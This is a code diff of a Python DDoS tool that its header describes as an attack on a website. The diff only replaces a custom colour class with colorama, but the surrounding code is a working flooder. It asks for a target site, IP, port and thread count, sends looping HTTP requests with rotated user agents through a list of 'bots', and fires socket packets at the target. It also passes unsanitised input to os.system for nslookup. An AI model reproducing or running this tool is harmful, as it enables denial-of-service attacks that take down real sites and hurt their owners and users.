@@ -5,18 +5,7 @@ DDos атака на сайт.
 import os
 from queue import Queue
 import time, socket, threading, urllib.request, random
-
-
-class Colors():
-    GRAY    = '\033[97m'
-    BLACK   = '\033[90m'
-    RED     = '\033[91m'
-    GREEN   = '\033[92m'
-    YELLOW  = '\033[93m'
-    BLUE    = '\033[94m'
-    PINK    = '\033[95m'
-    CYAN    = '\033[96m'
-    END     = '\033[0m'
+from colorama import Fore, init;init(autoreset=True)
 
 
 uagent = [
@@ -180,7 +169,7 @@ def botnet(url):
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print(f"{Colors.BLUE}Connecting to a botnet...{Colors.END}")
+            print(f"{Fore.BLUE}Connecting to a botnet...")
             time.sleep(.1)
     except:
         time.sleep(.1)
@@ -194,15 +183,15 @@ def down_it(item):
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
-                print(f"{Colors.BLUE}{time.ctime(time.time())} {Colors.END}"
-                      f"{Colors.GREEN}{i} packet sent to {Colors.BLUE}{host} {Colors.END}")
+                print(f"{Fore.BLUE}{time.ctime(time.time())} "
+                      f"{Fore.LIGHTBLUE_EX} {i} packet sent to {Fore.LIGHTCYAN_EX}{host}")
             else:
                 s.shutdown(1)
-                print(f"{Colors.RED}<->{Colors.END}")
+                print(f"{Fore.RED}<->")
             time.sleep(.1)
 
     except socket.error as e:
-        print(f"{Colors.RED}Error on server! Check the correct IP and Port...{Colors.END}")
+        print(f"{Fore.RED}Error on server! Check the correct IP and Port...")
         print(e)
         time.sleep(.1)
 
@@ -220,23 +209,23 @@ def dos2():
         botnet(random.choice(bots) + "http://" + host)
         w.task_done()
 
-if __name__ == '__main__':
 
-    web = input("Target website: ")
+if __name__ == '__main__':
+    web =  input(f"{Fore.CYAN}[*] {Fore.RESET}Target website: ")
     print(os.system(f"nslookup {web}"))
 
-    host = input(f"{Colors.BLUE}[*] {Colors.GREEN}IP Target >>> {Colors.END} ")
-    port = int(input(f"{Colors.BLUE}[*] {Colors.GREEN}PORT >>> {Colors.END} "))
-    thr_counts = int(input(f"{Colors.BLUE}[*] {Colors.GREEN}Counts of threads {Colors.GREEN}>>> {Colors.END} "))
+    host           = input(f"{Fore.CYAN}[*] {Fore.RESET}IP Target >>> ")
+    port       = int(input(f"{Fore.CYAN}[*] {Fore.RESET}PORT >>> "))
+    thr_counts = int(input(f"{Fore.CYAN}[*] {Fore.RESET}Counts of threads >>> "))
 
     os.system("clear")
-    print(f"{Colors.GREEN}ip-: {host} -port-: {port} -counts of threads-: {thr_counts} {Colors.END}")
-    print(f"{Colors.BLUE}Preparing for an attack{Colors.END}")
-    print(f"{Colors.CYAN} ======D     15% {Colors.END}"); time.sleep(.2)
-    print(f"{Colors.CYAN} =============D      25% {Colors.END}"); time.sleep(.3)
-    print(f"{Colors.CYAN} ====================D       50% {Colors.END}"); time.sleep(.4)
-    print(f"{Colors.CYAN} =============================D        75% {Colors.END}"); time.sleep(.3)
-    print(f"{Colors.CYAN} =====================================D     100% {Colors.END}"); time.sleep(.2)
+    print(f"{Fore.BLUE}Preparing for an attack")
+    print(f"ip-: {host} -port-: {port} -counts of threads-: {thr_counts}")
+    print(f"{Fore.CYAN} ======D   15%"); time.sleep(.2)
+    print(f"{Fore.CYAN} =============D    25%"); time.sleep(.3)
+    print(f"{Fore.CYAN} ====================D     50%"); time.sleep(.4)
+    print(f"{Fore.CYAN} =============================D    75%"); time.sleep(.3)
+    print(f"{Fore.CYAN} =====================================D    100%"); time.sleep(.2)
     os.system("clear")
 
     try:
@@ -244,8 +233,8 @@ if __name__ == '__main__':
         s.connect((host, int(port)))
         s.settimeout(1)
     except socket.error as e:
-        print(f"{Colors.GREEN}Checking the server IP and port...{Colors.END}\n"
-              f"{Colors.RED}Error! Check the correct IP and Port..{Colors.END}\n")
+        print(f"{Fore.CYAN}Checking the server IP and port...\n"
+              f"{Fore.RED}Error! Check the correct IP and Port..\n")
         raise e
 
     i = 0
